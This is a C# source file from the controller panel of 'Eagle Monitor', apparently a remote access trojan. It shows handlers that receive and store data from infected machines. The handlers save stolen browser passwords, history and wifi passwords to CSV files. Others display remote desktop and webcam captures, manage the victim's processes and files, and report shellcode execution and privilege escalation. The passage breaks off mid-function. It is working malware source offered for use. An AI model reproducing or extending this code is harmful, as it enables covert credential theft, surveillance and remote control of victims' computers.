using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using NativeAPI;
using static Shared.Serializer;
using static Shared.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor.Clients
{
    public class DataUtilities
    {
        public delegate Task SetData(Client C, Data Data, int Length);

        public static async Task SetClient(Client C, Data Data, int Length)
        {
            //Can cause high cpu usage
            /*Task T = Task.Run(() => 
            {
                NotificationForm n = new NotificationForm(Data.HWID, C.IP);
                n.Text = "New client connected !";
                n.titleLabel.Text = "New client connected !";
                n.notificationLabel.Text = "IP : " + C.IP;
                n.ShowDialog();
            });*/

            C.HWID = Data.HWID;
            //C.CountryInfo = (IPAPI.IP)Data.DataReturn[1];
            Client.ClientDictionary.Add(C.IP, C);
            List<string> ID = (List<string>)Data.DataReturn[0];
            C.Username = ID[2];
            ListViewItem I = new ListViewItem(ID[0]);
            System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + C.Username  + "@"+ C.HWID);
            ID[0] = C.IP;

            int i = 0;

            foreach (string sub in ID)
            {
                if(i != 8)
                    I.SubItems.Add(sub);
                i++;
            }

            string country = ID[8];
            I.ImageKey = country;
            /* if (country != "LOCALIP" && country != "NOCONNORLOCALIP")
             {
                 I.ImageKey = country;             
             }
             else 
             {
                 I.ImageKey = "icons8_black_flag_32.png";
             }*/
            I.SubItems.Add(C.Port.ToString());
            C.ClientLV = I;
            StartForm.M.clientsListView.Items.Add(I);
            await Task.Run(() => Utilities.Log("New connection from : " + C.IP + " with HWID : " + C.HWID, Color.FromArgb(0, 173, 239)));
            await Task.Run(() => Client.TasksLauncher(C, StartForm.M.tasksListView));       
        }

        public static async Task SetPasswords(Client C, Data Data, int Length)
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords") == false)
                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords");

                Client.ClientDictionary[Data.IP_Origin].passwordsForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                Client.ClientDictionary[Data.IP_Origin].passwordsForm.loadingCircle1.Visible = false;
                Client.ClientDictionary[Data.IP_Origin].passwordsForm.loadingCircle1.Active = false;
                await Task.Run(() => Utilities.Log("Successful passwords recovered from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
                try
                {
                    List<object[]> Passwords = Data.DataReturn;
                    await Task.Run(() =>
                    {

                        foreach (object[] o in Passwords)
                        {
                            ListViewItem I = new ListViewItem(o[0].ToString());
                            I.SubItems.Add(o[1].ToString());
                            I.SubItems.Add(o[2].ToString());
                            I.SubItems.Add(o[3].ToString());
                            Client.ClientDictionary[Data.IP_Origin].passwordsForm.passwordsListView.Items.Add(I);
                            Task.Delay(50).Wait();
                        }
                    });

                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].passwordsForm.passwordsListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords\\Passwords.csv"));

                }
                catch (System.Exception)
                {
                }
                finally
                {
                    Shared.Utils.ClearMem();
                }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
                //TODO: LOGS
            }
        }

        public static async Task SetHistory(Client C, Data Data, int Length)
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History") == false)
                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History");
                Client.ClientDictionary[Data.IP_Origin].historyForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                Client.ClientDictionary[Data.IP_Origin].historyForm.loadingCircle1.Visible = false;
                Client.ClientDictionary[Data.IP_Origin].historyForm.loadingCircle1.Active = false;
                await Task.Run(() => Utilities.Log("Successful history recovered from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
                try
                {

                    List<object[]> history = Data.DataReturn;
                    await Task.Run(() =>
                    {

                        foreach (object[] o in history)
                        {
                            ListViewItem I = new ListViewItem(o[0].ToString());
                            I.SubItems.Add(o[1].ToString());
                            I.SubItems.Add(o[2].ToString());
                            I.SubItems.Add(o[3].ToString());
                            Client.ClientDictionary[Data.IP_Origin].historyForm.historyListView.Items.Add(I);
                            Task.Delay(50).Wait();
                        }
                    });

                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].historyForm.historyListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History\\History.csv"));
                }
                catch (System.Exception)
                {
                }
                finally
                {                  
                    Shared.Utils.ClearMem();
                }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
                //TODO: LOGS
            }
        }

        public static async Task SetWifiPasswords(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords") == false)
                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords");
                Client.ClientDictionary[Data.IP_Origin].wifiForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                Client.ClientDictionary[Data.IP_Origin].wifiForm.loadingCircle1.Visible = false;
                Client.ClientDictionary[Data.IP_Origin].wifiForm.loadingCircle1.Active = false;
                await Task.Run(() => Utilities.Log("Successful wifi passwords recovered from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
                try
                {

                    List<string[]> wifiPasswords = Data.DataReturn;
                    await Task.Run(() =>
                    {

                        foreach (string[] o in wifiPasswords)
                        {
                            ListViewItem I = new ListViewItem(o[0].ToString());
                            I.SubItems.Add(o[1].ToString());
                            Client.ClientDictionary[Data.IP_Origin].wifiForm.wifiPasswordsListView.Items.Add(I);
                        }
                    });

                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].wifiForm.wifiPasswordsListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords\\WifiPasswords.csv"));

                }
                catch (System.Exception)
                {
                }
                finally
                {
                    Shared.Utils.ClearMem();
                }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
                //TODO: LOGS
            }
        }

        public static async Task SetProcess(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                Client.ClientDictionary[Data.IP_Origin].processManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                Client.ClientDictionary[Data.IP_Origin].processManagerForm.loadingCircle1.Visible = false;
                Client.ClientDictionary[Data.IP_Origin].processManagerForm.loadingCircle1.Active = false;
                await Task.Run(() => Utilities.Log("Successful processes list received from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
                try
                {

                    List<object[]> ProcList = Data.DataReturn;
                    await Task.Run(() =>
                    {
                        var ImgList = new ImageList();
                        ImgList.ColorDepth = ColorDepth.Depth32Bit;

                        ImgList.ImageSize = new Size(32, 32);
                        Client.ClientDictionary[Data.IP_Origin].processManagerForm.processesListView.SmallImageList = ImgList;

                        int x = 0;

                        foreach (object[] o in ProcList)
                        {
                            ListViewItem I = new ListViewItem(o[0].ToString());

                            I.Name = o[1].ToString();
                            I.SubItems.Add(o[1].ToString());
                            I.SubItems.Add(o[2].ToString());
                            I.SubItems.Add(o[3].ToString());
                            I.SubItems.Add(o[4].ToString());
                            //MessageBox.Show(o[4].ToString());// I.SubItems.Add(o[4].ToString());

                            Client.ClientDictionary[Data.IP_Origin].processManagerForm.processesListView.Items.Add(I);
                            try
                            {
                                byte[] b = (byte[])o[5];
                                ImgList.Images.Add(x.ToString(), Utilities.BytesToImage(b));

                            }
                            catch (System.Exception)
                            {
                                ImgList.Images.Add(x.ToString(), Eagle_Monitor.Properties.Resources.imageres_15);

                            }
                            I.ImageKey = x.ToString();
                            x += 1;
                        }
                    });
                }
                catch (System.Exception)
                {}
                finally { Shared.Utils.ClearMem(); }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
                //TODO: LOGS
            }
        }

        public static async Task SetKilledProc(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            Client.ClientDictionary[Data.IP_Origin].processManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
            bool b = (bool)Data.DataReturn[0];
            if (b)
            { await Task.Run(() => Utilities.Log("Successful killed process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235))); }
            else
            { await Task.Run(() => Utilities.Log("Cannot kill process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.Red)); return; }
            try
            {
            
                await Task.Run(() => {

                    Client.ClientDictionary[Data.IP_Origin].processManagerForm.processesListView.Items.RemoveByKey(Data.DataReturn[1].ToString());

                });
            }
            catch (System.Exception)
            {
            }
            finally { Shared.Utils.ClearMem(); }
        }

        public static async Task SetSuspendedProc(Client C, Data Data, int Length)
        {
            C.CloseClient();
            Client.ClientDictionary[Data.IP_Origin].processManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
            bool b = (bool)Data.DataReturn[0];
            if (b)
            { await Task.Run(() => Utilities.Log("Successful suspended process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235))); }
            else
            { await Task.Run(() => Utilities.Log("Cannot suspend process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.Red)); return; }

            Shared.Utils.ClearMem();
        }
        public static async Task SetResumedProc(Client C, Data Data, int Length)
        {
            C.CloseClient();
            Client.ClientDictionary[Data.IP_Origin].processManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
            bool b = (bool)Data.DataReturn[0];
            if (b)
            { await Task.Run(() => Utilities.Log("Successful resumed process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235))); }
            else
            { await Task.Run(() => Utilities.Log("Cannot resume process from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.Red)); }
             Shared.Utils.ClearMem();
        }
        public static async Task SetTextWindowProc(Client C, Data Data, int Length)
        {
            C.CloseClient();
            Client.ClientDictionary[Data.IP_Origin].processManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
            bool b = (bool)Data.DataReturn[0];
            if (b)
            { 
                await Task.Run(() => Utilities.Log("Successful changed text of process's window from : " + Data.HWID + " with IP : " + Data.IP_Origin + " with PID : " + Data.DataReturn[1].ToString(), Color.FromArgb(80, 68, 235)));
                try
                {
                    await Task.Run(() => Client.ClientDictionary[Data.IP_Origin].processManagerForm.processesListView.Items[Data.DataReturn[1].ToString()].SubItems[2].Text = Data.DataReturn[2].ToString());
                }
                catch (System.Exception)
                {
                }
            }
            else
            { await Task.Run(() => Utilities.Log("Cannot change of process's window : " + Data.HWID + " with IP : " + Data.IP_Origin + " with PID : " + Data.DataReturn[1].ToString(), Color.Red)); return; }         
            Shared.Utils.ClearMem();
        }

        public static async Task SetDisks(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                await Task.Run(() => Utilities.Log("Successful disks' list received from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
                try
                {

                    List<string> Disks = (List<string>)Data.DataReturn;
                    await Task.Run(() =>
                    {

                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Visible = false;
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Active = false;

                        foreach (string o in Disks)
                        {
                            Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.Items.Add(o);
                        }
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.SelectedItem = Client.ClientDictionary[Data.IP_Origin].fileManagerForm.disksComboBox.Items[0];
                    });
                }
                catch (System.Exception)
                {
                }
                finally { Shared.Utils.ClearMem(); }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
                //TODO: LOGS
            }
        }

        public static async Task SetFilesAndDirs(Client C, Data Data, int Length)
        {
            C.CloseClient();
            await Task.Run(() => Utilities.Log("Successful files and directories list received from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
            try
            {

                Dictionary<int, List<object[]>> ListOfFilesAndDirs = (Dictionary<int, List<object[]>>)Data.DataReturn[0];
                await Task.Run(() => {

                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Visible = false;
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Active = false;

                    ImageList ImageList = new ImageList();
                    ImageList.ColorDepth = ColorDepth.Depth32Bit;
                    ImageList.ImageSize = new Size(32, 32);
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.LargeImageList = ImageList;
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.SmallImageList = ImageList;

                    int x = 0;

                    foreach (object[] obj_ in ListOfFilesAndDirs[0])
                    {
                        ImageList.Images.Add(x.ToString(), Eagle_Monitor.Properties.Resources.icons8_folder_32);
                        var listViewItem = Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.Add(obj_[0].ToString());
                        listViewItem.Tag = "FOLDER";
                        listViewItem.Name = obj_[0].ToString();
                        listViewItem.ImageKey = x.ToString();
                        Task.Delay(10).Wait();
                    }

                    x++;

                    foreach (object[] obj_ in ListOfFilesAndDirs[1])
                    {
                        Image btm = Utilities.BytesToImage((byte[])obj_[1]);
                        ImageList.Images.Add(x.ToString(), btm);
                        ListViewItem listViewItem = new ListViewItem(obj_[0].ToString());
                        listViewItem.SubItems.Add(Shared.Utils.Numeric2Bytes((long)obj_[2]));
                        listViewItem.Tag = "FILE";
                        listViewItem.Name = obj_[0].ToString();
                        listViewItem.ImageKey = x.ToString();
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.Add(listViewItem);
                        x++;
                        Task.Delay(10).Wait();
                    }

                });
            }
            catch (System.Exception)
            {
            }
            finally { Shared.Utils.ClearMem(); }
        }

        public static async Task SetDeleteFile(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            bool b = (bool)Data.DataReturn[0];
            try
            {
                if (b)
                {
                    await Task.Run(() =>
                    {
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                        Utilities.Log("Successful deleted file : " + Data.DataReturn[1].ToString() + " from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235));
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.RemoveByKey(Utilities.SplitPath(Data.DataReturn[1].ToString()));
                    });
                }
                else
                { await Task.Run(() => Utilities.Log("Cannot delete file : " + Data.DataReturn[1].ToString() + " from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.Red)); }
            }
            catch (System.Exception)
            {

            }
            finally { Shared.Utils.ClearMem(); }         
        }

        public static async Task SetDownloadFile(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "File") == false)
                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "File");
            bool b = (bool)Data.DataReturn[0];
            try
            {
                if (b)
                {
                    await Task.Run(() =>
                    {
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                        Utilities.Log("Successful file downloaded : " + Data.DataReturn[1].ToString() + " from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235));
                        System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\File\\" + Utilities.SplitPath(Data.DataReturn[1].ToString()), Shared.Compressor.QuickLZ.Decompress((byte[])Data.DataReturn[2]));
                        Application.OpenForms[Utilities.SplitPath(Data.DataReturn[1].ToString())].Close();
                    });
                }
                else
                { await Task.Run(() => Utilities.Log("Cannot download file : " + Data.DataReturn[1].ToString() + " from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.Red)); Application.OpenForms[Utilities.SplitPath(Data.DataReturn[1].ToString())].Close(); }
            }
            catch (System.Exception)
            {
            //MessageBox.Show(ex.ToString());
            }
            finally { Shared.Utils.ClearMem(); }
        }


        public static async Task SetShortCutDir(Client C, Data Data, int Length)
        {
            C.CloseClient();
            await Task.Run(() => Utilities.Log("Successful files and directories list received from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235)));
            try
            {

                Dictionary<int, List<object[]>> ListOfFilesAndDirs = (Dictionary<int, List<object[]>>)Data.DataReturn[0];
                Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelPath.Text = Data.DataReturn[1].ToString();
                await Task.Run(() => {

                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Visible = false;
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.loadingCircle1.Active = false;

                    ImageList ImageList = new ImageList();
                    ImageList.ColorDepth = ColorDepth.Depth32Bit;
                    ImageList.ImageSize = new Size(32, 32);
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.LargeImageList = ImageList;
                    Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.SmallImageList = ImageList;

                    int x = 0;

                    foreach (object[] obj_ in ListOfFilesAndDirs[0])
                    {
                        ImageList.Images.Add(x.ToString(), Eagle_Monitor.Properties.Resources.icons8_folder_32);
                        var listViewItem = Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.Add(obj_[0].ToString());
                        listViewItem.Tag = "FOLDER";
                        listViewItem.Name = obj_[0].ToString();
                        listViewItem.ImageKey = x.ToString();
                    }

                    x++;

                    foreach (object[] obj_ in ListOfFilesAndDirs[1])
                    {
                        Image btm = Utilities.BytesToImage((byte[])obj_[1]);
                        ImageList.Images.Add(x.ToString(), btm);
                        ListViewItem listViewItem = new ListViewItem(obj_[0].ToString());
                        listViewItem.SubItems.Add(Shared.Utils.Numeric2Bytes((long)obj_[2]));
                        listViewItem.Tag = "FILE";
                        listViewItem.Name = obj_[0].ToString();
                        listViewItem.ImageKey = x.ToString();
                        Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.Add(listViewItem);
                        x++;
                    }

                });
            }
            catch (System.Exception)
            {
            }
            finally { Shared.Utils.ClearMem(); }
        }



        public static async Task SetRemoteViewer(Client C, Data Data, int Length) 
        {
            // C.CloseClient();      
            try
            {
                await Task.Run(() =>
                {
                    Image img = Utilities.BytesToImage(Shared.Compressor.QuickLZ.Decompress((byte[])Data.DataReturn[0]));
                    Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                    Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.desktopPictureBox.Image = img;
                    Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.rdSize = (Size)Data.DataReturn[1];
                });

                Client toSend = Client.ClientDictionary[Data.IP_Origin];

                /*  if (Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.HasToCapture == true)
                  {
                      Data D = new Data();
                      D.Type = Shared.PacketType.PLUGIN;
                      D.Plugin = Plugins.RemoteDesktop;
                      D.IP_Origin = toSend.IP;
                      D.HWID = toSend.HWID;
                      D.DataReturn = new object[] { Shared.PacketType.REMOTE_VIEW, toSend.remoteDesktopForm.desktopPictureBox.Width, toSend.remoteDesktopForm.desktopPictureBox.Height, toSend.remoteDesktopForm.quailitySiticoneTrackBar.Value, toSend.remoteDesktopForm.formatComboBox.Text };
                      await Task.Run(() => toSend.SendData(D.Serialize()));
                  }*/
                if (Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.HasToCapture == false)
                {
                    toSend.remoteDesktopForm.loadingCircle1.Visible = false;
                    toSend.remoteDesktopForm.loadingCircle1.Active = false;
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.RemoteDesktop;
                    D.IP_Origin = toSend.IP;
                    D.HWID = toSend.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.STOP_REMOTE_VIEW };
                    //await Task.Run(() => C.SendData(D.Serialize()));
                    C.SendData(D.Serialize());
                    C.CloseClient();
                }
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            //finally { C.CloseClient(); }
        }
    
        public static async Task SetManagedExecution(Client C, Data Data, int Length) 
        {
            C.CloseClient();
            ReturnHelper res = (ReturnHelper)Data.DataReturn[0];

            try
            {
                if (res.CheckError == false)
                {
                    await Task.Run(() =>
                    {
                        Client.ClientDictionary[Data.IP_Origin].executeDllForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                        Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Successful executed dll : " + Data.DataReturn[1].ToString() , Color.FromArgb(80, 68, 235));
                    });
                }
                else
                {
                    await Task.Run(() => Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Cannot execute file[Managed] : " + Data.DataReturn[1].ToString(), Color.Red));
                    await Task.Run(() => Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error : " + res.ErrorDescription, Color.Red));
                }
            }
            catch (System.Exception)
            {
                //MessageBox.Show(ex.ToString());
            }
            finally { Shared.Utils.ClearMem(); }
        }

        public static async Task SetShellCodeExecution(Client C, Data Data, int Length)
        {
            C.CloseClient();
            ReturnHelper res = (ReturnHelper)Data.DataReturn[0];
            try
            {
                if (res.CheckError == false)
                {
                    await Task.Run(() =>
                    {
                        Client.ClientDictionary[Data.IP_Origin].executeDllForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                        Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Successful executed shellcode : " + Data.DataReturn[1].ToString(), Color.FromArgb(80, 68, 235));
                    });
                }
                else
                {
                    await Task.Run(() => Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Cannot execute file[shellcode] : " + Data.DataReturn[1].ToString(), Color.Red));
                    await Task.Run(() => Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error : " + res.ErrorDescription, Color.Red));
                }
            }
            catch (System.Exception)
            {
                //MessageBox.Show(ex.ToString());
            }
            finally { Shared.Utils.ClearMem(); }
        }

        public static async Task SetWebCams(Client C, Data Data, int Length)
        {
            C.CloseClient();
            Client.ClientDictionary[Data.IP_Origin].webCamForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
            Client.ClientDictionary[Data.IP_Origin].webCamForm.loadingCircle1.Visible = false;
            Client.ClientDictionary[Data.IP_Origin].webCamForm.loadingCircle1.Active = false;
            try
            {
                 await Task.Run(() =>
                 {
                     List<string> CameraList = (List<string>)Data.DataReturn[0];
                     foreach (string cam in CameraList) 
                     {               
                         Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.Items.Add(cam);
                     }

                 });
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public static async Task SetCapturedWebCam(Client C, Data Data, int Length)
        {
            try
            {
                await Task.Run(() =>
                {
                    Image img = Utilities.BytesToImage(Shared.Compressor.QuickLZ.Decompress((byte[])Data.DataReturn[0]));
                    Client.ClientDictionary[Data.IP_Origin].webCamForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                    Client.ClientDictionary[Data.IP_Origin].webCamForm.camPictureBox.Image = img;
                });

                Client toSend = Client.ClientDictionary[Data.IP_Origin];

                /*  if (Client.ClientDictionary[Data.IP_Origin].webCamForm.HasToCapture == true)
                  {
                      Data D = new Data();
                      D.Type = Shared.PacketType.PLUGIN;
                      D.Plugin = Plugins.WebCam;
                      D.IP_Origin = toSend.IP;
                      D.HWID = toSend.HWID;
                      D.Misc = new object[] { Shared.PacketType.CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                      await Task.Run(() => C.SendData(D.Serialize()));     
                  }*/
                if (Client.ClientDictionary[Data.IP_Origin].webCamForm.HasToCapture == false)
                {
                    toSend.webCamForm.loadingCircle1.Visible = false;
                    toSend.webCamForm.loadingCircle1.Active = false;
                    Data D = new Data();
                    D.Type = Shared.PacketType.PLUGIN;
                    D.Plugin = Plugins.WebCam;
                    D.IP_Origin = toSend.IP;
                    D.HWID = toSend.HWID;
                    D.DataReturn = new object[] { Shared.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                    await Task.Run(() => C.SendData(D.Serialize()));
                    C.CloseClient();
                }
            }
            catch (System.Exception)
            {
                Client toSend = Client.ClientDictionary[Data.IP_Origin];
                toSend.webCamForm.loadingCircle1.Visible = false;
                toSend.webCamForm.loadingCircle1.Active = false;
                Data D = new Data();
                D.Type = Shared.PacketType.PLUGIN;
                D.Plugin = Plugins.WebCam;
                D.IP_Origin = toSend.IP;
                D.HWID = toSend.HWID;
                D.DataReturn = new object[] { Shared.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                await Task.Run(() => C.SendData(D.Serialize()));
                C.CloseClient();
                //MessageBox.Show(ex.ToString());
            }
        }


        public static async Task SetPrivilege(Client C, Data Data, int Length)
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                try
                {
                    await Task.Run(() =>
                    {
                        NativeAPI.NTSTATUS n = (NativeAPI.NTSTATUS)Data.DataReturn[0];
                        if (n == NTSTATUS.STATUS_SUCCESS)
                        {
                            if ((bool)Data.DataReturn[2] == false)
                            {
                                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Privilege got  : " + ((_PRIVILEGES)Data.DataReturn[1]).ToString(), Color.FromArgb(80, 68, 235));
                            }
                            else
                            {
                                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Privilege has already been enabled : " + ((_PRIVILEGES)Data.DataReturn[1]).ToString(), Color.Red);
                            }
                        }

                        else
                        {
                            Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Privilege not enabled : " + ((_PRIVILEGES)Data.DataReturn[1]).ToString() + " NTSTATUS Code : " + n.ReturnNTSTATUS(), Color.Red);
                        }

                    });
                }
                catch (System.Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else 
            {
                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
            }
        }


        public static async Task SetComputerInformation(Client C, Data Data, int Length)
        {
            C.CloseClient();
            if (Data.returnError.hasError == false)
            {
                try
                {
                    Client.ClientDictionary[Data.IP_Origin].informationForm.featuresListView.Items.Clear();
                    Client.ClientDictionary[Data.IP_Origin].informationForm.systemInformationListView.Items.Clear();
                    await Task.Run(() =>
                    {
                        //string CPUInformation = Data.DataReturn[0].ToString();

                        Dictionary<string, string> infoList = (Dictionary<string, string>)Data.DataReturn[0];

                        string[] SplitInformation = infoList["CPU"].Split('\n');

                        Client.ClientDictionary[Data.IP_Origin].informationForm.vendorLabel.Text = SplitInformation[0];
                        Client.ClientDictionary[Data.IP_Origin].informationForm.brandLabel.Text = SplitInformation[1];
                        ListViewItem item;
                        for (int i = 2; i < SplitInformation.Length - 1; i++) 
                        {
                            string[] SplitFeature = SplitInformation[i].Split(' ');
                            item = new ListViewItem(SplitFeature[0]);

                            if (SplitFeature[1] == "1") 
                                item.SubItems.Add("Yes");
                            else
                                item.SubItems.Add("No");

                            Client.ClientDictionary[Data.IP_Origin].informationForm.featuresListView.Items.Add(item);

                        }

                        for (int i = 1; i < infoList.Count; i++) 
                        {
                            var info = infoList.ElementAt(i);
                            item = new ListViewItem(info.Key);
                            item.SubItems.Add(info.Value);
